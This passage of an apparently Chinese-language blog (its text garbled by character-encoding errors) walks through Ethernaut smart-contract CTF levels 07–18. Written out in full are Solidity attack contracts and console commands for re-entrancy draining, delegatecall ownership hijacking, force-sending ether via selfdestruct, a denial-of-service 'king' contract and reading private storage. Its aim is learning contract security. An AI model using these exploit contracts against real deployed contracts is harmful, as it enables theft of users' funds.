<li><p>å¦‚æœ selfdestruct å‡½æ•°è¢«éé¢„æœŸæ‰§è¡Œï¼Œæ•´ä¸ªåˆçº¦ä¼šæ‹’ç»æœåŠ¡</p></li>
</ol>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªåˆçº¦ï¼Œè®©å®ƒææ„çš„æ—¶å€™ç»™è¦æ”»å‡»çš„åˆçº¦è½¬å…¥ 1wei,åœ¨
remix ä¸Šéƒ¨ç½²ä»¥ä¸‹åˆçº¦å³å¯ï¼Œè®°å¾— value è®¾ç½®æˆ 1wei</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function forceAttack(address payable _addr) payable external &#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="vault">08 Vault</h2>
<p>vault æ˜¯é‡‘åº“çš„æ„æ€ï¼Œåˆçº¦æºç æŠŠå¯†ç è®¾ç½®æˆ private äº†ï¼Œä½†è¿™ä¸ª private
æ˜¯å¹½é»˜ privateï¼Œå› ä¸ºåŒºå—é“¾ä¸­æ‰€æœ‰å­˜å‚¨åœ¨ storage
é‡Œçš„ä¸œè¥¿éƒ½æ˜¯å…¬å¼€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ <a
href="https://ethereum.stackexchange.com/questions/13910/how-to-read-a-private-variable-from-a-contract">getStorageAt</a>
æ¥æŸ¥çœ‹åˆçº¦çš„æƒ…å†µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await web3.eth.getStorageAt(instance);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,1);</span><br><span class="line">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,0);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,2);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span><br><span class="line">await web3.eth.getStorageAt(instance,3);</span><br><span class="line">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span><br><span class="line"></span><br><span class="line">await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;);</span><br><span class="line"></span><br><span class="line">await contract.locked();</span><br></pre></td></tr></table></figure>
<h2 id="king">09 King</h2>
<p><code>((await contract.prize()).toString());</code>
å¯ä»¥æŸ¥çœ‹è¿™ä¸ªåˆçº¦çš„ä½™é¢ã€‚</p>
<p>transfer è½¬è´¦æ—¶å¦‚æœé‡åˆ°é”™è¯¯ä¼š revert,
æ ¹æ®è¿™ä¸ªç‰¹æ€§å¯ä»¥ä½¿å¾—æŸä¸ªæ¶æ„åˆçº¦æˆä¸º king, è¯¥åˆçº¦çš„ receive æ–¹æ³•å§‹ç»ˆ
revertï¼Œè€Œcallå’Œsendå‡½æ•°åˆ™ä¸æ˜¯ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªfalseï¼Œå› æ­¤è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦æ£€æŸ¥callå’Œsendçš„è¿”å›å€¼çš„åŸå› ã€‚</p>
<p>ç›´æ¥å†™ä¸ªåˆçº¦ï¼Œåœ¨é‡Œé¢fallbackæŠ›å‡ºå¼‚å¸¸å³å¯ã€‚ä¸è¿‡è®¾ç½® revert
æœ‰ä¸ªæ¯”è¾ƒéº»çƒ¦çš„ç‚¹æ˜¯ä¸èƒ½ç»™è¿™ä¸ªåˆçº¦è½¬é’±äº†ï¼Œæ‰€ä»¥åªèƒ½æŠŠæˆ‘çš„é’±åŒ…åœ°å€è®¾ç½®ç™½åå•äº†ã€‚ä¸è¿‡æˆ–è®¸å¯ä»¥ç”¨ä¹‹å‰é‚£ä¸ª
Force çš„æ–¹å¼è¯•è¯•ğŸ¤”ä¹‹åå†è¯´å§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    event Received(address sender);</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if(msg.sender != Your Wallet Address here)&#123;</span><br><span class="line">            emit Received(msg.sender); // è®°å½• msg.sender</span><br><span class="line">            revert(&quot;Error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimKing(address payable addr) public payable &#123;</span><br><span class="line">        (bool success, ) = addr.call&#123;value: 0.01 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="re-entrancy">10 Re-entrancy</h2>
<p>é‡å…¥æ”»å‡»ä¹…ä»°å¤§åï¼Œé‡å…¥æŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨è¢«æ”»å‡»åˆçº¦æ›´æ–°ä½™é¢å‰é‡å¤ææ¬¾çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨
fallback æˆ–è€… receive å‡½æ•°é‡Œå†æ¬¡è°ƒç”¨
withdrawï¼Œè¿™æ ·ä»–å°±ä¼šå†æ¬¡å‘è¢«æ”»å‡»åˆçº¦æå‡ºææ¬¾è¯·æ±‚ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨<code>await getBalance(contract.address)</code>æ¥æŸ¥çœ‹åˆçº¦çš„ä½™é¢ï¼Œè¿™é‡Œâ€œåˆçº¦ä½™é¢â€ä¸â€œåˆçº¦å®šä¹‰çš„ç”¨æˆ·ä½™é¢â€ä¸å¤ªä¸€æ ·ï¼Œè¦æ³¨æ„ä¸€ä¸‹ã€‚</p>
<p>è¿˜æœ‰å°±æ˜¯ï¼Œæˆ‘æœ€åæ”»å‡»çš„æ—¶å€™ç”¨æˆ·ä½™é¢å·²ç»æº¢å‡ºäº†ï¼Œä»ç„¶ä¸èƒ½ææ¬¾ï¼Œåº”è¯¥æ˜¯æ¯æ¬¡ææ¬¾çš„æ•°ç›®å·²ç»å¤§äºâ€œåˆçº¦ä½™é¢â€äº†ï¼Œæ¯”å¦‚åˆçº¦ä½™é¢åªå‰©0.004çš„æ—¶å€™æˆ‘è¦æ0.01ï¼Œé‚£å°±æ˜¯ä¸è¡Œçš„ï¼Œåªèƒ½ä»¥0.001ä¸ºå•ä½å»æå–ã€‚</p>
<p>exp å¦‚ä¸‹ï¼Œä¸è¿‡è¦åœ¨å‰é¢åŠ ä¸Š <a
href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8e0296096449d9b1cd7c5631e917330635244c37/contracts/math/SafeMath.sol">SafeMathåº“</a>ï¼Œç„¶åæŠŠé¢˜ç›®æºç ä¹Ÿç²˜åœ¨å‰é¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">// ç²˜è´´ SafeMath åº“</span><br><span class="line"></span><br><span class="line">// ç²˜è´´é¢˜ç›®æºç </span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Reentrance r;</span><br><span class="line">    uint256 amount = 0.001 ether;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address payable addr) public &#123;</span><br><span class="line">        r = Reentrance(addr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(r).balance &gt;= amount) &#123;</span><br><span class="line">            r.withdraw(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        r.donate&#123;value: amount&#125;(address(this));</span><br><span class="line">        r.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toMe() external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</span><br><span class="line">        (bool success, ) = owner.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="elevator">11 Elevator</h2>
<p>è¿™é“é¢˜åœ¨æœ¬åœ°å®ç°å¥½
isLastFloorï¼Œè®©å…¶æ ¹æ®è°ƒç”¨æ¬¡æ•°çš„ä¸åŒè¿”å›ä¸åŒå€¼å°±è¡Œï¼Œç¬¬ä¸€æ¬¡è¿”å›
falseï¼Œç¬¬äºŒæ¬¡è¿”å› true.</p>
<p>é¢˜ç›®æç¤ºåˆçº¦ä¸é€‚åˆä¿å­˜ promisesï¼Œæˆ‘æœ‰ç‚¹æ²¡å¤ªç†è§£ promises
çš„æ„æ€...æˆ–è®¸ä¹‹åå¯ä»¥çœ‹çœ‹ view å’Œ pure æ¥å¸®åŠ©ç†è§£è¿™ä¸€ç‚¹å§ã€‚ä»Šå¤©åˆ·äº† 8
é“é¢˜ï¼Œå¾—ä¼‘æ¯ä¸€ä¸‹..</p>
<p>é¢˜ç›®è¯´ï¼š</p>
<blockquote>
<p>ä½ å¯ä»¥åœ¨æ¥å£ä½¿ç”¨ view å‡½æ•°ä¿®æ”¹å™¨æ¥é˜²æ­¢çŠ¶æ€è¢«ç¯¡æ”¹. pure
ä¿®æ”¹å™¨ä¹Ÿå¯ä»¥é˜²æ­¢çŠ¶æ€è¢«ç¯¡æ”¹. è®¤çœŸé˜…è¯» Solidity's documentation
å¹¶å­¦ä¹ æ³¨æ„äº‹é¡¹. å®Œæˆè¿™ä¸€å…³çš„å¦ä¸€ä¸ªæ–¹æ³•æ˜¯æ„å»ºä¸€ä¸ª view å‡½æ•°,
è¿™ä¸ªå‡½æ•°æ ¹æ®ä¸åŒçš„è¾“å…¥æ•°æ®è¿”å›ä¸åŒçš„ç»“æœ, ä½†æ˜¯ä¸æ›´æ”¹çŠ¶æ€, æ¯”å¦‚
gasleft().</p>
</blockquote>
<p>æŠ½æ—¶é—´å¯ä»¥çœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;// ...</span><br><span class="line"></span><br><span class="line">contract Building &#123;</span><br><span class="line">    address public target = 0x225B6F1A5823e1dA88195BD6bA571f9D9B4C659f;</span><br><span class="line">    bool public flag = false;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">        if(flag == false)&#123;</span><br><span class="line">            flag = true;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="privacy">12 privacy</h2>
<p>è·Ÿ Vault é‚£é¢˜åŒºåˆ«ä¸å¤§ï¼Œä¹Ÿæ˜¯è®¡ç®—å‡ºå˜é‡å­˜å‚¨çš„ slot ç„¶å getStorageAt
å°±å¯ä»¥äº†ï¼Œåªä¸è¿‡ unlock å‡½æ•°é‡Œå–äº† data[2] çš„å‰åå…­å­—èŠ‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool public locked = true;   //0</span><br><span class="line">uint256 public ID = block.timestamp;   //1</span><br><span class="line">uint8 private flattening = 10;      //2</span><br><span class="line">uint8 private denomination = 255;     //2</span><br><span class="line">uint16 private awkwardness = uint16(now);     //2</span><br><span class="line">bytes32[3] private data;       // 3 4 5</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0</span>);</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">1</span>);</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000669db9d8&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">2</span>);</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000b9d8ff0a&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">3</span>);</span><br><span class="line"><span class="string">&#x27;0x981640b3c7b393cf50dc3dc775cc956dd7293184d5d7e41799a3d83ecd976f87&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">4</span>);</span><br><span class="line"><span class="string">&#x27;0xed854f8fb8465be2b28d43a0d5e5f3e6b0679e5aa11c05848878c90d0b8c8b17&#x27;</span></span><br><span class="line"><span class="comment">// this is what we need</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">5</span>);</span><br><span class="line"><span class="string">&#x27;0x7511365c632ac62dc1071f0f24d9dc40245bfa8c01761c5462eea210a26621e8&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">6</span>);</span><br><span class="line"><span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&quot;0x7511365c632ac62dc1071f0f24d9dc40&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-one">13 Gatekeeper One</h2>
<p>å…ˆçœ‹gate1ï¼Œè·Ÿ telephone é‚£é“é¢˜ä¸€æ ·ï¼Œå†™ä¸ªåˆçº¦è°ƒå°±è¡Œäº†ã€‚</p>
<p>gate2éœ€è¦æ§åˆ¶ gasï¼Œæ¯”è¾ƒç›´æ¥çš„æ–¹å¼å°±æ˜¯çˆ†ç ´ call å‡½æ•°é‡Œçš„ gas å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint i = 0; i &lt; 500; i ++) &#123;</span><br><span class="line">    try gatekeeper.enter&#123;gas: 8191 * 3 + i&#125;(gateKey) returns (bool result) &#123;</span><br><span class="line">        return result;</span><br><span class="line">    &#125; catch &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gate3 æœ‰è¿™æ ·å‡ æ¡é™åˆ¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ä½ 2byte ä¸ ä½ 4byte ç›¸ç­‰</span><br><span class="line">uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</span><br><span class="line">// ä½ 4byte ä¸ ä½ 8byte ä¸ç­‰</span><br><span class="line">uint32(uint64(_gateKey)) != uint64(_gateKey)</span><br><span class="line">// ä½ 4byte ä¸ tx.origin çš„ä½ 2byte ç›¸ç­‰</span><br><span class="line">uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</span><br></pre></td></tr></table></figure>
<p>bytesxx å–çš„æ˜¯é«˜ä½çš„xxå­—èŠ‚ï¼Œuintxx
å–çš„æ˜¯ä½ä½çš„xxä½ï¼Œå½“å°å˜é‡ä¸å¤§å˜é‡ä½œæ¯”è¾ƒæ—¶ï¼Œä¼šå°†å°å˜é‡é›¶æ‰©å±•ï¼Œå³å‰é¢æ·»0.
äº†è§£è¿™äº› gate3 å°±å¯ä»¥ç»•äº†ã€‚å¾ˆç®€å•ï¼Œåªè¦å–è‡ªå·±é’±åŒ…åœ°å€çš„ä½ 64bitï¼Œä¸
0xffffffff0000ffff ç›¸ä¸å°±è¡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function attack(address addr) external returns (bool) &#123;</span><br><span class="line">        GatekeeperOne pwner = GatekeeperOne(addr);</span><br><span class="line">        bytes8 gatekey = bytes8(uint64(uint160(tx.origin))) &amp; 0xffffffff0000ffff;</span><br><span class="line"></span><br><span class="line">        for(uint i = 0; i &lt; 500; i++) &#123;</span><br><span class="line">            try pwner.enter&#123;gas: 8192 * 3 + i&#125;(gatekey) returns (bool result) &#123;</span><br><span class="line">                return result;</span><br><span class="line">            &#125; catch &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-two">14 Gatekeeper Two</h2>
<p>gate1 ä¹Ÿæ˜¯è¦è°ƒåˆçº¦</p>
<p>å¯¹äº gate2 ï¼Œcaller å‡½æ•°ç­‰ä»·äºè¿”å› msg.senderï¼Œextcodesize
å‡½æ•°æ˜¯è®¡ç®—è¯¥åœ°å€çš„åˆçº¦ä»£ç é•¿åº¦ï¼Œgate2 ä¸­è¦æ±‚åˆçº¦ä»£ç é•¿åº¦ä¸º
0ï¼Œè€Œå½“åˆçº¦çš„æ„é€ å‡½æ•°æ­£åœ¨æ‰§è¡Œæ—¶ï¼Œè¯¥åˆçº¦çš„ä»£ç è¿˜æœªè¢«å®Œå…¨éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œå› æ­¤
extcodesize åœ¨è¿™ä¸ªæ—¶é—´ç‚¹ä¸Šè¿”å›çš„ç»“æœä¸º 0ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©åœ¨ Attack å‡½æ•°çš„æ„é€ å‡½æ•°ä¸­æ‰§è¡Œæ”»å‡»ä»£ç </p>
<p>å¯¹äºgate3ï¼Œæˆ‘ä»¬éœ€è¦è®© gateKey ç­‰äº 0xffffffffffffffff ^ MitM è°ƒç”¨
enter çš„å‡½æ•°ç­¾åï¼Œexp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        GatekeeperTwo g = GatekeeperTwo(addr);</span><br><span class="line">        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;</span><br><span class="line">        g.enter(gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="naught-coin">15 Naught Coin</h2>
<p>ERC-20 æ ‡å‡†æ”¯æŒå°†ä¸€å®šæ•°é‡çš„ä»£å¸æˆæƒ (approve) ç»™æŸä¸ªåœ°å€ (è¢«æˆæƒæ–¹),
ç„¶åè¢«æˆæƒæ–¹å°±èƒ½å¤Ÿä½¿ç”¨ transferFrom æ”¯é…æˆæƒæ–¹çš„ä»£å¸</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// current balance: 1000000000000000000000000</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// approve to another contract</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(<span class="string">&quot;0x148258832f9925fC21Cf5B13d5aE21EE1e6ce1F0&quot;</span>, <span class="string">&quot;1000000000000000000000000&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// invoke Attack.attack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance again</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>
<h2 id="preservation">16 Preservation</h2>
<p>æˆ‘ä»¬å†æ¥é‡æ–°è®¤è¯†ä¸€ä¸‹ delegatecallï¼š</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰åˆçº¦ A é€šè¿‡ delegatecall è°ƒç”¨äº†åˆçº¦ B çš„å‡½æ•° funcBï¼Œé‚£ä¹ˆ
funcB ä¸­ä¿®æ”¹çš„å˜é‡å…¶å®éƒ½æ˜¯åˆçº¦ A ä¸­çš„å˜é‡ã€‚é‚£ä¹ˆå¯èƒ½æœ‰äººè¦é—®ï¼Œåˆçº¦ B
æ˜¯æ€ä¹ˆçŸ¥é“ A çš„å˜é‡çš„ï¼Ÿå®é™…ä¸Šï¼Œdelegatecall
æ˜¯æ ¹æ®çŠ¶æ€å˜é‡çš„å®šä¹‰é¡ºåºå»å¯»æ‰¾è¢«è°ƒç”¨åˆçº¦å¯¹åº”çš„ slot ä½ç½®,
ç„¶åè¿›è¡Œè®¿é—®å’Œä¿®æ”¹ã€‚</p>
<p>å› æ­¤ï¼ŒLibraryContract ä¸­çš„ setTime ä¿®æ”¹çš„ storedTimeï¼Œå…¶å®æ˜¯ä¿®æ”¹äº†
Preservation åˆçº¦ä¸­çš„
timeZone1Libraryï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ä¿®æ”¹ä¸ºæ¶æ„åˆçº¦åœ°å€ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await contract.setFirstTime(&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä½†è¿™é‡Œæˆ‘æœ‰ä¸€ä¸ªä¸å¤ªæ˜ç™½çš„ç‚¹æ˜¯ï¼Œæ˜æ˜ä¼ å…¥çš„å‚æ•°æ˜¯ 32bytes çš„ï¼Œè€Œ
timeZone1Library æ˜¯ 20bytes çš„ address
å˜é‡ï¼Œæˆ‘ä¸æ¸…æ¥šæ˜¯æ€ä¹ˆæ•°æ®è½¬æ¢ä»¥åŠæ”¾å…¥ slot å½“ä¸­çš„</p>
</blockquote>
<p>è€Œå½“æˆ‘ä»¬ä¿®æ”¹äº† timeZone1Library ä¸ºæ¶æ„åˆçº¦åœ°å€ï¼Œå†ç”¨ setFirstTime
è°ƒç”¨ setTime å°±è°ƒç”¨çš„æ˜¯æ¶æ„åˆçº¦çš„ setTime äº†ï¼Œæ­¤æ—¶æ¶æ„åˆçº¦ç›´æ¥å†™å¥½åŒæ ·çš„
setTime ç­¾åï¼Œå†…éƒ¨å®ç° owner = msg.sender å³å¯æˆåŠŸææƒã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ”¹ä¸ºæ¶æ„åˆçº¦çš„åœ°å€</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ææƒ</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;anything&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EvilLibraryContract &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 /*_time*/) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="recovery">17 Recovery</h2>
<p>åä¸ƒé¢˜äº†ï¼Œè¿˜æ˜¯æ²¡åŠæ³•è„±ç¦»é¢˜è§£è‡ªå·±æƒ³åˆ°å“ªé‡Œæ˜¯ vulnerable
çš„ï¼Œåˆçº¦åŸºç¡€è¿˜æ²¡æ‰“ç‰¢...å¾—ç»§ç»­åŠªåŠ›ğŸ˜­</p>
<p>è¿™é“é¢˜å¤§æ„ä¸º Recovery åˆçº¦åˆ›å»ºäº† SimpleToken åˆçº¦ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°
SimpleToken
è¿™ä¸ªåˆçº¦çš„åœ°å€äº†ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬æ‰¾åˆ°è¿™ä¸ªåœ°å€ï¼Œå¹¶æŠŠè¿™ä¸ªåœ°å€é‡Œçš„å¸è½¬ç§»å‡ºæ¥ã€‚</p>
<p>é¦–å…ˆè¦è§£å†³çš„é—®é¢˜æ˜¯ï¼šå¦‚ä½•æ‰¾åˆ°è¿™ä¸ªåˆçº¦ï¼Ÿ</p>
<ul>
<li>æ–¹æ¡ˆä¸€ï¼šetherscan ç›´æ¥æœå®ä¾‹åœ°å€</li>
</ul>
<p>é€šè¿‡è·Ÿè¿›â€œå®ä¾‹åœ°å€â€ï¼ˆå…¶å®å°±æ˜¯ Recovery
è¿™ä¸ªåˆçº¦çš„åœ°å€ï¼‰åˆ›å»ºçš„æ–°åˆçº¦çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ° SimpleToken çš„åœ°å€</p>
<ul>
<li>æ–¹æ¡ˆäºŒï¼š<a
href="https://learnblockchain.cn/2019/06/10/address-compute/">è®¡ç®—</a></li>
</ul>
<p>è¿™ä¸ªæ–¹æ¡ˆæˆ‘æ²¡ä»”ç»†çœ‹...å…ˆæŠŠé“¾æ¥æ”¾åœ¨è¿™å„¿</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"><span class="comment"># keccak256(address, nonce)</span></span><br><span class="line"><span class="comment"># 0xfe... æ˜¯å®ä¾‹åœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(web3.Web3.keccak(rlp.encode([<span class="number">0xfeB38d24C57d0462741d90E44b07d976f99fBf71</span>,<span class="number">1</span>]))[<span class="number">12</span>:])))</span><br><span class="line"><span class="comment"># 0xd1d9a8e9388dbeb6f0714340e4d44b0587c6145e &lt;-è¿™ä¸ªæ˜¯ SimpleToken çš„åœ°å€</span></span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°åˆçº¦ä¹‹åï¼Œæˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼Œå¦‚ä½•æŠŠ SimpleToken
ä¸­çš„åˆçº¦ä»£å¸è½¬å‡ºæ¥ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° SimpleToken åˆçº¦ä¸­å­˜åœ¨ destruct å‡½æ•°ï¼Œè€Œ <a
href="remix.ethereum.org">Remix</a>
ä¸ºæˆ‘ä»¬æä¾›äº†ä¸ç°æœ‰åˆçº¦äº¤äº’çš„åŠŸèƒ½ï¼Œå³éƒ¨ç½²æ—¶çš„ "At
Address"ï¼Œè¿™é‡Œå€Ÿäº†å¼ å›¾ğŸ‘‡</p>
<figure>
<img
src="https://img.exp10it.io/2024/04/202404221233489.png?size=medium"
alt="å€Ÿçš„å›¾" />
<figcaption aria-hidden="true">å€Ÿçš„å›¾</figcaption>
</figure>
<p>å°†æˆ‘ä»¬é’±åŒ…çš„åœ°å€å†™åœ¨ destroy ä¸­ï¼Œå°±å¯ä»¥å°†åˆçº¦ä¸­çš„ä»£å¸è½¬å‡ºå•¦</p>
<h2 id="magicnumber">18 MagicNumber</h2>
<p>ä»Šå¤©å®Œå…¨ä¸æƒ³çœ‹åŸç†ã€‚ã€‚å…ˆ fork ä¸€ä¸‹åˆ«äººçš„ wp æ”¹å¤©å†æ¥çœ‹</p>
<p>æ¡ä»¶: æä¾›ä¸€ä¸ªåˆçº¦åœ°å€, è¯¥åˆçº¦æœ€å¤šåŒ…å« 10 ä¸ª opcode, å¹¶åœ¨è°ƒç”¨
whatIsTheMeaningOfLife æ–¹æ³•æ—¶è¿”å›æ•°å­— 42</p>
<p>https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iii-the-function-selector-6a9b6886ea49</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iv-function-wrappers-d8e46672b0ed</p>
<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-v-function-bodies-2d19d4bef8be</p>
